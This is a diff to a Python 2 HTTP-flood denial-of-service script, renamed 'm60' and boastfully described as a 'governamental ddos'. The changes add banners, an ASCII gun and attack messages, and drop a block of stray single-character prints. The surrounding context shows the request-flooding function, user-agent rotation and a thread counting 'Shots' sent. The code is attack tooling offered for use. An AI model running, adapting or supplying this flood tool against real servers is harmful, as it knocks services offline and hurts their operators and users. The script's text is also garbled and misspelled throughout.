@@ -61,12 +61,36 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	
-	
+	print 'USAGE: python m60.py <url>'
+	print 'The m60 was one governamental ddos the distribuition of this is limited Created by : Hax Stroke'
 	print "\a"
+print \
+"""            _________
+            /'        /|
+           /         / |_
+          /         /  //|
+         /_________/  ////|
+        |   _ _    | 8o////|
+        | /'// )_  |   8///|
+        |/ // // ) |   8o///|
+        / // // //,|  /  8//|
+       / // // /// | /   8//|
+      / // // ///__|/    8//|
+     /.(_)// /// |       8///|
+    (_)' `(_)//| |       8////|___________
+   (_) /_\ (_)'| |        8///////////////
+   (_) \"/ (_)'|_|         8/////////////
+    (_)._.(_) d' Hb         8oooooooopb'
+      `(_)'  d'  H`b
+            d'   `b`b
+           d'     H `b
+          d'      `b `b
+         d'           `b
+        d'             `b  
+"""
+print '---------------------------------------------------'
 
-
-
+	
 #http request
 def httpcall(url):
 	useragent_list()
@@ -89,31 +113,8 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'r'
- 			print 'q'
- 			print 'p'
- 			print 'f'
- 			print '3'
- 			print 'e'
- 			print 'w'
- 			print 'o'
- 			print 'x'
- 			print 'y'
- 			print '7'
- 			print 'j'
- 			print 'i'
- 			print 'g'
-                        print 'z'
-                        print 'c'
-                        print '4'
-                        print '2'
-                        print 'n'
-                        print '7'
-                        print 'g'
-                        print 'k'
-                        print '8'
-                        print '0'
-			code=500	
+ 			print 'm60 Was Shotting All protection fo the server'
+			code=500
 	except urllib2.URLError, e:
 			#print e.reason
 			sys.exit()
@@ -143,7 +144,7 @@ class MonitorThread(threading.Thread):
 				print "%d Shots sends Senting" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n -0 Hits are secced"
+			print "\n -M60 Hits are secced"
 
 #execute 
 if len(sys.argv) < 2:
@@ -154,7 +155,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-	
+		print "Ak 47 attack was been sended This tool is created by : Russian Hackers"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
